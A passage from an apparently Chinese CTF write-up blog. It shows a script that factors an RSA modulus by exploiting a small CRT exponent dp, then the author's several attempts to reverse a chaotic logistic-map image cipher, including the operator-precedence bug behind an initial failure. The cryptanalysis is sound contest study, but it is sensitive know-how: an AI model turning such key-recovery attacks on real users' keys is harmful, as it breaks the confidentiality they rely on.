class="keyword">return</span> <span class="built_in">int</span>(math.log(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog10_math</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(math.log10(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog10_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gmpy.log10(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_mod</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a % b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> gmpy_version &gt; <span class="number">0</span>:</span><br><span class="line">    gcd = gmpy.gcd</span><br><span class="line">    invmod = gmpy.invert</span><br><span class="line">    gcdext = gmpy.gcdext</span><br><span class="line">    is_square = gmpy.is_square</span><br><span class="line">    next_prime = gmpy.next_prime</span><br><span class="line">    is_prime = gmpy.is_prime</span><br><span class="line">    fib = gmpy.fib</span><br><span class="line">    primes = _primes_gmpy</span><br><span class="line">    lcm = gmpy.lcm</span><br><span class="line">    invert = gmpy.invert</span><br><span class="line">    powmod = gmpy.powmod</span><br><span class="line">    ilog = _ilog_gmpy</span><br><span class="line">    ilog2 = _ilog2_gmpy</span><br><span class="line">    mod = gmpy.f_mod</span><br><span class="line">    log = gmpy.log</span><br><span class="line">    log2 = gmpy.log2</span><br><span class="line">    log10 = gmpy.log10</span><br><span class="line">    ilog10 = _ilog10_gmpy</span><br><span class="line">    <span class="keyword">if</span> gmpy_version == <span class="number">2</span>:</span><br><span class="line">        isqrt = gmpy.isqrt</span><br><span class="line">        introot = _introot_gmpy2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        isqrt = gmpy.sqrt</span><br><span class="line">        introot = _introot_gmpy</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gcd = _gcd</span><br><span class="line">    isqrt = _isqrt</span><br><span class="line">    introot = _introot</span><br><span class="line">    invmod = _invmod</span><br><span class="line">    gcdext = _gcdext</span><br><span class="line">    is_square = _is_square</span><br><span class="line">    next_prime = _next_prime</span><br><span class="line">    fib = _fib</span><br><span class="line">    primes = erathostenes_sieve</span><br><span class="line">    is_prime = _is_prime</span><br><span class="line">    fib = _fib</span><br><span class="line">    primes = _primes</span><br><span class="line">    lcm = _lcm</span><br><span class="line">    invert = _invmod</span><br><span class="line">    powmod = <span class="built_in">pow</span></span><br><span class="line">    ilog = _ilog_math</span><br><span class="line">    ilog2 = _ilog2_math</span><br><span class="line">    mod = _mod</span><br><span class="line">    log = math.log</span><br><span class="line">    log2 = math.log2</span><br><span class="line">    log10 = math.log10</span><br><span class="line">    ilog10 = _ilog10_math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trivial_factorization_with_n_phi</span>(<span class="params">N, phi</span>):</span></span><br><span class="line">    m = N - phi + <span class="number">1</span></span><br><span class="line">    i = isqrt(<span class="built_in">pow</span>(m, <span class="number">2</span>) - (N &lt;&lt; <span class="number">2</span>))  <span class="comment"># same as isqrt((m**2) - (4*n))</span></span><br><span class="line">    roots = <span class="built_in">int</span>((m - i) &gt;&gt; <span class="number">1</span>), <span class="built_in">int</span>((m + i) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> roots[<span class="number">0</span>] * roots[<span class="number">1</span>] == N:</span><br><span class="line">        <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__all__ = [</span><br><span class="line">    getpubkeysz,</span><br><span class="line">    gcd,</span><br><span class="line">    isqrt,</span><br><span class="line">    introot,</span><br><span class="line">    invmod,</span><br><span class="line">    gcdext,</span><br><span class="line">    is_square,</span><br><span class="line">    next_prime,</span><br><span class="line">    is_prime,</span><br><span class="line">    fib,</span><br><span class="line">    primes,</span><br><span class="line">    lcm,</span><br><span class="line">    invert,</span><br><span class="line">    powmod,</span><br><span class="line">    ilog2,</span><br><span class="line">    ilog,</span><br><span class="line">    ilog10,</span><br><span class="line">    mod,</span><br><span class="line">    log,</span><br><span class="line">    log2,</span><br><span class="line">    log10,</span><br><span class="line">    trivial_factorization_with_n_phi,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poly_fast_ntl</span>(<span class="params">ctx, f, xs</span>):</span></span><br><span class="line">    <span class="comment"># Fast multipoint evaulation from Modern Computer Algebra 3rd edition 10.1</span></span><br><span class="line">    n = <span class="built_in">len</span>(xs)</span><br><span class="line">    rems = [<span class="number">0</span>] * (<span class="number">4</span> * n)  <span class="comment"># segment tree max size</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build_tree</span>(<span class="params">i, l, r</span>):</span></span><br><span class="line">        <span class="keyword">if</span> l + <span class="number">1</span> == r:</span><br><span class="line">            x = xs[l] <span class="keyword">if</span> l &lt; <span class="built_in">len</span>(xs) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            rems[i] = ntl_ZZ_pX([-x, <span class="number">1</span>], ctx)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        build_tree(i * <span class="number">2</span>, l, mid)</span><br><span class="line">        build_tree(i * <span class="number">2</span> + <span class="number">1</span>, mid, r)</span><br><span class="line">        rems[i] = rems[i * <span class="number">2</span>] * rems[i * <span class="number">2</span> + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    build_tree(<span class="number">1</span>, <span class="number">0</span>, n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compute</span>(<span class="params">f, i, l, r</span>):</span></span><br><span class="line">        <span class="keyword">if</span> l + <span class="number">1</span> == r:</span><br><span class="line">            <span class="keyword">yield</span> f % rems[i]</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">from</span> compute(f % rems[<span class="number">2</span> * i], <span class="number">2</span> * i, l, mid)</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">from</span> compute(f % rems[<span class="number">2</span> * i + <span class="number">1</span>], <span class="number">2</span> * i + <span class="number">1</span>, mid, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>(<span class="keyword">lambda</span> r: Integer(r.<span class="built_in">list</span>()[<span class="number">0</span>]), compute(f, <span class="number">1</span>, <span class="number">0</span>, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor</span>(<span class="params">n, e, bound</span>):</span></span><br><span class="line">    <span class="comment"># https://mathoverflow.net/questions/120160/attack-on-crt-rsa</span></span><br><span class="line">    D = ceil(sqrt(bound))</span><br><span class="line">    ctx = ntl_ZZ_pContext(n)  <span class="comment"># NTL&#x27;s polynomial multiplication is much faster</span></span><br><span class="line">    x = randint(<span class="number">1</span>, n - <span class="number">1</span>)</span><br><span class="line">    xe = <span class="built_in">int</span>(powmod(x, e, n))</span><br><span class="line">    poly_factors = []</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, D):</span><br><span class="line">        poly_factors.append(ntl_ZZ_pX([-x, power_mod(xe, a, n)], ctx))</span><br><span class="line">    poly = product(poly_factors)</span><br><span class="line">    xed = <span class="built_in">int</span>(powmod(xe, D, n))</span><br><span class="line">    ys = [<span class="built_in">int</span>(powmod(xed, b, n)) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, D)]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> poly_fast_ntl(ctx, poly, ys):</span><br><span class="line">        p = gcd(t, n)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> p &lt; n:</span><br><span class="line">            <span class="keyword">return</span> p, n // p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    n = <span class="number">6006128121276172470274143101473619963750725942458450119252491144009018469845917986523007748831362674341219814935241703026024431390531323127620970750816983</span></span><br><span class="line">    e = <span class="number">2953544268002866703872076551930953722572317122777861299293407053391808199220655289235983088986372630141821049118015752017412642148934113723174855236142887</span></span><br><span class="line">    bound = <span class="number">2</span>**<span class="number">20</span>  <span class="comment"># upper bound of min(d_p, d_q)</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):  <span class="comment"># Retrying</span></span><br><span class="line">        r = factor(n, e, bound)</span><br><span class="line">        <span class="keyword">if</span> r <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            p, q = r</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">0</span>)  <span class="comment"># Prints 0 if failed</span></span><br></pre></td></tr></table></figure>

<p>用这个可以分解出p，后面的就不再赘述；做密码题的套路就是能知晓，能找源码</p>
<p>来自天命团队的密码师傅直接推导出来，从dp这个可以爆破点入手，求出了p，强。贴下<a href="https://mp.weixin.qq.com/s?__biz=Mzk0NzI0NTI2OA==&mid=2247485067&idx=1&sn=23d4b9fadcdec4db76ef46d07a684cad&chksm=c3789f30f40f1626f924f2a49ed00665bc9c5edc5bdbaa4baa6eefecb97c2a745e20c8469e8a&mpshare=1&scene=23&srcid=0801l9lK8AdmMIgwadJXiRw7&sharer_sharetime=1627828345543&sharer_shareid=18ef5175242004180f2ee4dd9c244e8a#rd">天命团队</a>链接</p>
<h3 id="Crypto-MedicalImage（recuring）"><a href="#Crypto-MedicalImage（recuring）" class="headerlink" title="Crypto-MedicalImage（recuring）"></a>Crypto-MedicalImage（recuring）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">getcontext().prec = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># It is based on logistic map in chaotic systems</span></span><br><span class="line">    <span class="comment"># The parameter r takes the largest legal value</span></span><br><span class="line">    <span class="keyword">assert</span>(x&gt;=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(x&lt;=<span class="number">1</span>)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># same as f1</span></span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># same as f1</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryptImage</span>(<span class="params">path</span>):</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(path)</span><br><span class="line">    size = im.size</span><br><span class="line">    pic  = np.array(im) </span><br><span class="line">    im.close()</span><br><span class="line">    r1 = Decimal(<span class="string">&#x27;0.478706063089473894123&#x27;</span>)</span><br><span class="line">    r2 = Decimal(<span class="string">&#x27;0.613494245341234672318&#x27;</span>)</span><br><span class="line">    r3 = Decimal(<span class="string">&#x27;0.946365754637812381837&#x27;</span>)</span><br><span class="line">    w,h = size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        r1 = f1(r1)</span><br><span class="line">        r2 = f2(r2)</span><br><span class="line">        r3 = f3(r3)</span><br><span class="line">    const = <span class="number">10</span>**<span class="number">14</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            x1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r1))%w</span><br><span class="line">            y1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r2))%h</span><br><span class="line">            r1 = f1(r1)</span><br><span class="line">            r2 = f2(r2)</span><br><span class="line">            tmp = pic[y,x]</span><br><span class="line">            pic[y,x] = pic[y1,x1]</span><br><span class="line">            pic[y1,x1] = tmp</span><br><span class="line">    p0 = random.randint(<span class="number">100</span>,<span class="number">104</span>)</span><br><span class="line">    c0 = random.randint(<span class="number">200</span>,<span class="number">204</span>)</span><br><span class="line">    config = (p0,c0)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            k = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r3))%<span class="number">256</span></span><br><span class="line">            k = <span class="built_in">bin</span>(k)[<span class="number">2</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            k = <span class="built_in">int</span>(k[p0%<span class="number">8</span>:]+k[:p0%<span class="number">8</span>],<span class="number">2</span>)</span><br><span class="line">            r3 = f3(r3)</span><br><span class="line">            p0 = pic[y,x]</span><br><span class="line">            c0 = k^((k+p0)%<span class="number">256</span>)^c0</span><br><span class="line">            pic[y,x] = c0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pic,size,config</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outputImage</span>(<span class="params">path,pic,size</span>):</span></span><br><span class="line">    im = Image.new(<span class="string">&#x27;P&#x27;</span>, size,<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    pixels = im.load()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">1</span>]):</span><br><span class="line">            pixels[i,j] = (<span class="built_in">int</span>(pic[j][i]))</span><br><span class="line"></span><br><span class="line">    im.save(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptImage</span>(<span class="params">pic,size,config</span>):</span></span><br><span class="line">    .....</span><br><span class="line">    </span><br><span class="line">enc_img = <span class="string">&#x27;flag.bmp&#x27;</span></span><br><span class="line">out_im = <span class="string">&#x27;flag_enc.bmp&#x27;</span></span><br><span class="line"></span><br><span class="line">pic,size,_ = encryptImage(enc_img)</span><br><span class="line">outputImage(out_im,pic,size)</span><br></pre></td></tr></table></figure>

<p>不知道为什么没有出来，找到混淆函数，然后加密和解密很类似，最后跑了6400张图片，没有解出来，等WP；所用的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">getcontext().prec = <span class="number">20</span></span><br><span class="line">enc_img = <span class="string">&#x27;flag.bmp&#x27;</span></span><br><span class="line">out_im = <span class="string">&#x27;flag_enc.bmp&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># It is based on logistic map in chaotic systems</span></span><br><span class="line">    <span class="comment"># The parameter r takes the largest legal value</span></span><br><span class="line">    x = <span class="number">4</span> * x * (<span class="number">1</span>-x)</span><br><span class="line">    <span class="keyword">assert</span>(x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(x &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outputImage</span>(<span class="params">path, pic, size</span>):</span></span><br><span class="line">    im = Image.new(<span class="string">&#x27;P&#x27;</span>, size, <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    pixels = im.load()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">1</span>]):</span><br><span class="line">            pixels[i, j] = (<span class="built_in">int</span>(pic[j][i]))</span><br><span class="line"></span><br><span class="line">    im.save(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptImage</span>(<span class="params">p1, config, p0x</span>):</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(out_im)</span><br><span class="line">    size = im.size</span><br><span class="line">    pic = np.array(im)</span><br><span class="line">    im.close()</span><br><span class="line">    r1 = Decimal(<span class="string">&#x27;0.478706063089473894123&#x27;</span>)</span><br><span class="line">    r2 = Decimal(<span class="string">&#x27;0.613494245341234672318&#x27;</span>)</span><br><span class="line">    r3 = Decimal(<span class="string">&#x27;0.946365754637812381837&#x27;</span>)</span><br><span class="line">    w, h = size</span><br><span class="line">    rx1 = []</span><br><span class="line">    rx2 = []</span><br><span class="line">    rx3 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        r1 = f1(r1)</span><br><span class="line">        r2 = f1(r2)</span><br><span class="line">        r3 = f1(r3)</span><br><span class="line">        rx1.append(r1)</span><br><span class="line">        rx2.append(r2)</span><br><span class="line">        rx3.append(r3)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            r1 = f1(r1)</span><br><span class="line">            r2 = f1(r2)</span><br><span class="line">            r3 = f1(r3)</span><br><span class="line">            rx1.append(r1)</span><br><span class="line">            rx2.append(r2)</span><br><span class="line">            rx3.append(r3)</span><br><span class="line">    const = <span class="number">10</span> ** <span class="number">14</span></span><br><span class="line">    p0, c0 = config</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            k = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r3)) % <span class="number">256</span></span><br><span class="line">            k = <span class="built_in">bin</span>(k)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            k = <span class="built_in">int</span>(k[p0 % <span class="number">8</span>:] + k[:p0 % <span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">            rx3.pop()</span><br><span class="line">            r3 = rx3[-<span class="number">1</span>]</span><br><span class="line">            p0 = p0x</span><br><span class="line">            c0 = k^((k+p0)%<span class="number">256</span>)^c0</span><br><span class="line">            pic[y, x] = c0</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            x1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r1)) % w</span><br><span class="line">            y1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r2)) % h</span><br><span class="line">            rx1.pop()</span><br><span class="line">            rx2.pop()</span><br><span class="line">            r1 = rx1[-<span class="number">1</span>]</span><br><span class="line">            r2 = rx2[-<span class="number">1</span>]</span><br><span class="line">            tmp = pic[y, x]</span><br><span class="line">            pic[y, x] = pic[y1, x1]</span><br><span class="line">            pic[y1, x1] = tmp</span><br><span class="line">    outputImage(p1, pic, size)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> p0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">105</span>):</span><br><span class="line">    <span class="keyword">for</span> c0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>, <span class="number">205</span>):</span><br><span class="line">        <span class="keyword">for</span> p0xx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            decryptImage(<span class="built_in">str</span>(i)+<span class="string">&#x27;.bmp&#x27;</span>, (p0, c0), p0xx)</span><br><span class="line">            i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>看了来自天命团队的WP，还是逆算法的问题，想太简单了，以为加密即解密，稍微改一下就行</p>
<p>摆出re的态度，先cp下源码，自己重新写下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> (x &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span> * x * (<span class="number">1</span> - x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> (x &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span> * x * (<span class="number">1</span> - x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> (x &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span> * x * (<span class="number">1</span> - x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag_enc.bmp&#x27;</span>)</span><br><span class="line">size = im.size</span><br><span class="line">pic = np.array(im)</span><br><span class="line">im.close()</span><br><span class="line">r1 = Decimal(<span class="string">&#x27;0.478706063089473894123&#x27;</span>)</span><br><span class="line">r2 = Decimal(<span class="string">&#x27;0.613494245341234672318&#x27;</span>)</span><br><span class="line">r3 = Decimal(<span class="string">&#x27;0.946365754637812381837&#x27;</span>)</span><br><span class="line">w, h = size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    r1 = f1(r1)</span><br><span class="line">    r2 = f2(r2)</span><br><span class="line">    r3 = f3(r3)</span><br><span class="line">const = <span class="number">10</span> ** <span class="number">14</span></span><br><span class="line">p = [<span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>]</span><br><span class="line">c = [<span class="number">200</span>, <span class="number">201</span>, <span class="number">202</span>, <span class="number">203</span>]</span><br><span class="line">R1, R2, R3 = r1, r2, r3</span><br><span class="line">l1 = []</span><br><span class="line">l2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(w * h):</span><br><span class="line">    l1.append(r1)</span><br><span class="line">    l2.append(r2)</span><br><span class="line">    r1 = f1(r1)</span><br><span class="line">    r2 = f2(r2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">p0, c0, r1=R1, r2=R2, r3=R3</span>):</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            k = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r3)) % <span class="number">256</span></span><br><span class="line">            k = <span class="built_in">bin</span>(k)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            k = <span class="built_in">int</span>(k[p0 % <span class="number">8</span>:] + k[:p0 % <span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">            r3 = f3(r3)</span><br><span class="line">            pic[y, x] = ((pic[y, x] ^ c0 ^ k) - k) % <span class="number">256</span></span><br><span class="line">            p0 = pic[y, x]</span><br><span class="line">            c0 = k ^ ((k + p0) % <span class="number">256</span>) ^ c0</span><br><span class="line">    t = w * h - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            x1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const * l1[t])) % w</span><br><span class="line">            y1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const * l2[t])) % h</span><br><span class="line">            tmp = pic[y, x]</span><br><span class="line">            pic[y, x] = pic[y1, x1]</span><br><span class="line">            pic[y1, x1] = tmp</span><br><span class="line">            t -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> pic, size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc_img = <span class="string">&#x27;flag.bmp&#x27;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> p0 <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">for</span> c0 <span class="keyword">in</span> c:</span><br><span class="line">        pic, size = decrypt(p0, c0)</span><br><span class="line">        im = Image.new(<span class="string">&#x27;P&#x27;</span>, size, <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">        pixels = im.load()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">1</span>]):</span><br><span class="line">                pixels[i, j] = (<span class="built_in">int</span>(pic[j][i]))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        im.save(<span class="built_in">str</span>(count) + enc_img)</span><br></pre></td></tr></table></figure>

<p>好了，我开始复现惹。比赛中确实是草率了，很多点没有get到</p>
<p>好吧，我是废物，感觉都逆完了呀，但就是出不来；就瞄一眼师傅的，就一眼。emmmmm，卧槽！我怎么也想不到会死在这里</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210805191752700.png" alt="image-20210805191752700"></p>
<p>运算优先级，异或没有加括号，惹你了温，建议抄一百遍优先级表，<strong>位运算的优先级比加减要低</strong></p>
<p>顺带发现师傅只爆破了16种情况</p>
<p>然后卧法先万泉煤油宝破德碧瑶，因为我出来是25张flag</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210805192547584.png" alt="image-20210805192547584"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">getcontext().prec = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># It is based on logistic map in chaotic systems</span></span><br><span class="line">    <span class="comment"># The parameter r takes the largest legal value</span></span><br><span class="line">    <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> (x &lt;= <span class="number">1</span>)</span><br><span class="line">    x = <span class="number">4</span> * x * (<span class="number">1</span> - x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span 